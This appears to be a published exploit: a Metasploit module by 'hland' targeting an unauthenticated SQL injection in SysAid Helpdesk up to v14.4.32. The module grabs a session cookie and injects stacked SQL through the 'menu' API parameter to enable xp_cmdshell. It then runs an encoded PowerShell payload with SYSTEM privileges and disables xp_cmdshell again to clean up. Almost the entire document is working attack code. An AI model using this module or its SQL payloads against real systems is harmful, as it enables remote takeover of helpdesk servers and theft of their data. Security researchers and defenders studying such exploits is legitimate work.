# Exploit Title: Sysaid Helpdesk Software Unauthenticated SQLi
# Date: 28.11.2015
# Exploit Author: hland
# Vendor Homepage: https://www.sysaid.com/
# Version: v14.4.32 b25
# Tested on: Windows 7, Windows 10
# Blog post: http://blog.blankhat.pw/2015/09/unauthenticated-sql-injection-in-sysaid.html


##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
require 'msf/core/exploit/powershell'
require 'msf/core/exploit/mssql_commands'


class Metasploit3 < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Powershell
  include Msf::Exploit::Remote::HttpClient



  def initialize(info={})
    super(update_info(info,
      'Name'           => "Sysaid Helpdesk Software Unauthenticated SQLi",
      'Description'    => %q{
        This module exploits an unauthenticated SQLi vulnerability in the Sysaid 
        Helpdesk Free software. Because the "menu" parameter is not handled correctly,
        a malicious user can manipulate the SQL query, and allows
        arbitrary code execution under the context of 'SYSTEM' because the database
        runs as the SA user. This module uses a Metasploit generated Powershell payload and 
	uses xp_cmdshell, which is activated and then deactivated after exploitation.
      },
      'License'        => MSF_LICENSE,
      'Author'         =>
        [
          'Hland', 
        ],
      'References'     =>
        [
          ['CVE', 'xxxx'],
        ],
      'Payload'        =>
        {
          'BadChars' => "\x00"
        },
      'DefaultOptions'  =>
        {
          'InitialAutoRunScript' => 'migrate -f'
        },
      'Platform'       => 'win',
      'Targets'        =>
        [
          ['Sysaid Helpdesk <= v14.4.32 b25', {}]
        ],
      'Privileged'     => false,
      'DisclosureDate' => "Aug 29 2015",
      'DefaultTarget'  => 0,

))

      register_options(
        [
          OptPort.new('RPORT',     [true, "The web application's port", 8080]),
          OptString.new('TARGETURI', [true, 'The base path to to the web application', '/'])
        ], self.class)
  end

  def check

    peer = "#{rhost}:#{rport}"
    uri = target_uri.path
    uri = normalize_uri(uri,"Login.jsp")

    print_status("#{peer} - Checking for vulnerability")

    res = send_request_cgi({
      'method'    => 'GET',
      'uri'       => uri,
      'vars_get' => {
      }
    })

    v = res.body.scan(/\<title\>SysAid Help Desk Software\<\/title\>/)
    if not v
        vprint_error("Is this even a Sysaid Help Desk?")
        return Exploit::CheckCode::Safe
    else
        vprint_status("Identified system as Sysaid Help Desk")
	return Exploit::CheckCode::Appears

    end

    return Exploit::CheckCode::Unknown

  end

  def mssql_xpcmdshell(cmd,doprint=false,opts={})
    force_enable = false
    begin
      res = mssql_query("EXEC master..xp_cmdshell '#{cmd}'", doprint)
      #mssql_print_reply(res) if doprint

      return res

    rescue RuntimeError => e
      if(e.to_s =~ /xp_cmdshell disabled/)
        force_enable = true
        retry
      end
      raise e
    end
  end

  def exploit
    peer = "#{rhost}:#{rport}"
    uri = target_uri.path

    vprint_line("#{peer} - Getting a session token...")
    
    res = send_request_cgi({
      'method'    => 'GET',
      'uri'       => normalize_uri(uri, "Login.jsp"),
      'vars_get' => {
      }
    })

    vprint_line("#{peer} - Cookie's in the jar...")

    # Got a cookie, now ready to make exploiting requests
    if res && res.code == 200
        #vprint_line("#{res.headers}")
        cookies = res.get_cookies
        #vprint_line("#{cmd_psh_payload(payload.encoded, payload_instance.arch.first)}")
    else
        vprint_line("No 200 response? I'm outta here")
        return

    end

    # Put together the vulnerable URI
    uri = normalize_uri(uri,"api","v1","menu","menu_items")

    # Generate powershell payload as an encoded string
    powershell_payload = cmd_psh_payload(payload.encoded, payload_instance.arch.first, {:encode_final_payload => true, :remove_comspec => true})

    

    #
    # Inject payload and wait for shell
    #
    print_status("#{peer} - Trying to activate xp_cmdshell and exploit vulnerability")

    sqli = "main';exec master.dbo.sp_configure 'show advanced options',1;RECONFIGURE;exec master.dbo.sp_configure 'xp_cmdshell', 1;RECONFIGURE;EXEC master..xp_cmdshell '#{powershell_payload}';--"
    res = send_request_cgi({
      'method'    => 'GET',
      'uri'       => uri,
      'cookie'    => cookies,
      'vars_get' => {
        'menu' => sqli,
      }
    })


    # Deactivate XPCmdShell
    sqli = "main';exec sp_configure 'xp_cmdshell', 0 ;RECONFIGURE;exec sp_configure 'show advanced options', 0 ;RECONFIGURE;--"
    print_status("#{peer} - Deactivating xp_cmdshell to clean up after ourselves..")

    res = send_request_cgi({
      'method'    => 'GET',
      'uri'       => uri,
      'cookie'    => cookies,
      'vars_get' => {
        'menu' => sqli,
      }
    })

  end
end